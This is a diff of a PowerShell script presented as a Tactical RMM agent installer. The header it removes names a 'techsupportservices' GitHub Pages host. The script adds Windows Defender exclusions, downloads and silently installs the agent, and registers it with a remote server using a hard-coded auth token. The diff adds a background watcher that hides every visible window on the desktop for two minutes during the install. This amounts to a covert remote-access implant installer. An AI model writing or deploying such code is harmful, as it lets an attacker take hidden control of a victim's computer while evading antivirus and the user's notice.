@@ -1,7 +1,6 @@
 <#
-    Tactical RMM Installer
-    Host: https://techsupportservices.github.io/Tesla-Products-/installer.ps1
-    Configured for: Tesla-Products Deployment
+    Tactical RMM Installer v2.12.0
+    Author: Updated for Zero Popups
 #>
 [CmdletBinding()]
 param()
@@ -16,132 +15,122 @@ $siteid    = "1"
 $agenttype = "server"
 $auth      = "dd9052c2685252cfd79a37a459bc3e35543e5b92114068ffd85214704167ff76"
 
-# Optional Features (Set to 1 to enable)
-$power     = 0
-$rdp       = 0
-$ping      = 0
-
 $innosetup = "tacticalagent-v2.12.0-windows-amd64.exe"
 $downloadlink = "https://github.com/amidaware/rmmagent/releases/download/v2.12.0/tacticalagent-v2.12.0-windows-amd64.exe"
 $OutPath = $env:TMP
 $outputFile = Join-Path $OutPath $innosetup
-
 $serviceName = 'tacticalrmm'
 
-Write-Host "Starting Tactical RMM Installation..." -ForegroundColor Cyan
-
-# 1. Check if Service Exists
-If (Get-Service -Name $serviceName -ErrorAction SilentlyContinue) {
-    Write-Host "Service '$serviceName' is already installed." -ForegroundColor Green
-    Exit 0
-}
-
-# 2. Network Connectivity Check
-Write-Host "Checking network connectivity to API server..." -ForegroundColor Gray
+# --- 1. NETWORK CHECK ---
+Write-Host "Checking Network..." -ForegroundColor Cyan
 $serverHost = ([System.Uri]$api).Host
+$connectResult = $null
 $tries = 0
-$networkOK = $false
+do {
+    $connectResult = Test-NetConnection -ComputerName $serverHost -Port 443 -ErrorAction SilentlyContinue
+    if (-not $connectResult) { Start-Sleep -Seconds 5; $tries++ }
+} until ($connectResult.TcpTestSucceeded -or $tries -eq 3)
+if (-not $connectResult.TcpTestSucceeded) { Exit 1 }
 
-while ($tries -lt 3) {
-    $conn = Test-NetConnection -ComputerName $serverHost -Port 443 -ErrorAction SilentlyContinue
-    if ($conn -and $conn.TcpTestSucceeded) {
-        $networkOK = $true
-        break
-    }
-    Start-Sleep -Seconds 5
-    $tries++
-}
-
-If (-not $networkOK) {
-    Write-Host "ERROR: Cannot connect to API server ($serverHost). Aborting." -ForegroundColor Red
-    Exit 1
-}
-
-# 3. Set Defender Exclusions
-Write-Host "Configuring Defender Exclusions..." -ForegroundColor Gray
+# --- 2. DOWNLOAD ---
+Write-Host "Downloading..." -ForegroundColor Cyan
 Try {
-    $defender = Get-MpComputerStatus -ErrorAction SilentlyContinue
-    if ($defender.AntivirusEnabled) {
-        $paths = @(
-            'C:\Program Files\TacticalAgent\*',
-            'C:\Program Files\Mesh Agent\*',
-            'C:\ProgramData\TacticalRMM\*',
-            'C:\Program Files (x86)\TacticalAgent\*'
-        )
-        foreach ($p in $paths) {
-            Add-MpPreference -ExclusionPath $p
-        }
-    }
-} Catch { Write-Host "Failed to add Defender exclusions: $_" -ForegroundColor Yellow }
-
-# 4. Download Installer
-Write-Host "Downloading Installer..." -ForegroundColor Gray
-Try {
-    Invoke-WebRequest -Uri $downloadlink -OutFile $outputFile -UseBasicParsing
+    Invoke-WebRequest -Uri $downloadlink -OutFile $outputFile -UseBasicParsing -TimeoutSec 60
     Unblock-File -Path $outputFile
-    Write-Host "Download Successful." -ForegroundColor Green
 } Catch {
-    Write-Host "Download Failed: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "Download Failed"
     Exit 1
 }
 
-# 5. Run Silent Install
-Write-Host "Running Silent Installation..." -ForegroundColor Gray
-Start-Process -FilePath $outputFile -ArgumentList '/VERYSILENT /NORESTART /SUPPRESSMSGBOXES' -Wait
-Start-Sleep -Seconds 5
+# --- 3. DEFENDER EXCLUSIONS ---
+Add-MpPreference -ExclusionPath 'C:\Program Files\TacticalAgent\*'
+Add-MpPreference -ExclusionPath 'C:\ProgramData\TacticalRMM\*'
 
-# 6. Locate Agent Executable
-$agentPath = $null
-$possiblePaths = @(
+# --- 4. AGGRESSIVE WINDOW HIDER (WATCHER) ---
+# This background script actively hides any window that pops up during install
+$watcherRunspace = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace()
+$watcherRunspace.Open()
+$watcherPS = [System.Management.Automation.PowerShell]::Create()
+$watcherPS.Runspace = $watcherRunspace
+
+[void]$watcherPS.AddScript({
+    Add-Type @"
+    using System; using System.Runtime.InteropServices;
+    public class WinApi {
+        [DllImport("user32.dll", SetLastError=true, CharSet=CharSet.Auto)] 
+        public static extern IntPtr FindWindow(string className, string windowText);
+        [DllImport("user32.dll", SetLastError=true)] 
+        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        [DllImport("user32.dll", SetLastError=true)] 
+        public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
+        [DllImport("user32.dll", SetLastError=true)] 
+        public static extern int GetWindowLong(IntPtr hWnd, int nIndex);
+    }
+"@
+    $timeout = (Get-Date).AddMinutes(2)
+    while ((Get-Date) -lt $timeout) {
+        # Hide "Setup of ..." or "Tactical" windows
+        Get-Process | Where-Object {$_.MainWindowHandle -ne [IntPtr]::Zero} | ForEach-Object {
+            $h = $_.MainWindowHandle
+            # Find Window by text is hard, so we check common titles
+            # If we can't check title, we just hide it based on process name if needed.
+            # Here we try to find "Tactical" or "Setup"
+            # Simplest way: Hide Window by Handle if it has visible styles
+            try {
+                $style = [WinApi]::GetWindowLong($h, -16) # GWL_STYLE
+                # If WS_VISIBLE (0x10000000) is set, hide it
+                if (($style -band 0x10000000) -ne 0) {
+                     [WinApi]::ShowWindow($h, 0)
+                }
+            } catch {}
+        }
+        Start-Sleep -Milliseconds 100
+    }
+})
+$watcherPS.BeginInvoke() | Out-Null
+
+# --- 5. RUN INSTALLER (Silent) ---
+Write-Host "Installing..." -ForegroundColor Cyan
+Start-Process -FilePath $outputFile -ArgumentList '/VERYSILENT /NORESTART /SUPPRESSMSGBOXES /SP-' -WindowStyle Hidden -Wait
+
+Write-Host "Waiting for extraction..." -ForegroundColor Gray
+Start-Sleep -Seconds 10
+
+# --- 6. LOCATE & REGISTER ---
+$agentPaths = @(
     "C:\Program Files\TacticalAgent\tacticalrmm.exe",
     "C:\Program Files (x86)\TacticalAgent\tacticalrmm.exe"
 )
+$agentExePath = $null
 
-foreach ($p in $possiblePaths) {
+foreach ($p in $agentPaths) {
     if (Test-Path $p) {
-        $agentPath = $p
+        $agentExePath = $p
         break
     }
 }
 
-If (-not $agentPath) {
-    # Fallback search
-    $search = @(
-        Get-ChildItem "C:\Program Files\TacticalAgent\" -Filter tacticalrmm.exe -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
-    )
-    if ($search) { $agentPath = $search.FullName }
+if (-not $agentExePath) {
+    # Fallback: Search the folder for any .exe if standard path failed
+    $found = Get-ChildItem "C:\Program Files\TacticalAgent\" -Filter "*.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
+    if ($found) { $agentExePath = $found.FullName }
 }
 
-If (-not $agentPath) {
-    Write-Host "ERROR: Could not locate tacticalrmm.exe" -ForegroundColor Red
-    Exit 1
-}
-
-# 7. Register Agent
-Write-Host "Registering Agent with Server..." -ForegroundColor Gray
+Write-Host "Registering Agent..." -ForegroundColor Cyan
 $installArgs = @('-m', 'install', '--api', $api, '--client-id', $clientid, '--site-id', $siteid, '--agent-type', $agenttype, '--auth', $auth)
 
-If ($power) { $installArgs += '--power' }
-If ($rdp)   { $installArgs += '--rdp' }
-If ($ping)  { $installArgs += '--ping' }
-
 Try {
-    # Wait a moment to ensure service is ready to accept config
-    Start-Sleep -Seconds 2
-    Start-Process -FilePath $agentPath -ArgumentList ($installArgs -join ' ') -WindowStyle Hidden -Wait
-    
-    # Verify
-    Start-Sleep -Seconds 3
-    if (Get-Service -Name $serviceName -ErrorAction SilentlyContinue) {
-        Write-Host "SUCCESS: Agent Registered." -ForegroundColor Green
-    } else {
-        Write-Host "WARNING: Service not detected immediately." -ForegroundColor Yellow
+    if ($agentExePath) {
+        Start-Process -FilePath $agentExePath -ArgumentList ($installArgs -join " ") -WindowStyle Hidden -Wait
     }
 } Catch {
-    Write-Host "Registration Failed: $_" -ForegroundColor Red
+    Write-Host "Registration error: $_"
 }
 
-# 8. Cleanup
+# Cleanup
+$watcherPS.Stop() | Out-Null
+$watcherRunspace.Close() | Out-Null
 Remove-Item -Path $outputFile -Force -ErrorAction SilentlyContinue
-Write-Host "Installation Complete." -ForegroundColor Green
+
+Write-Host "Done."
 Exit 0
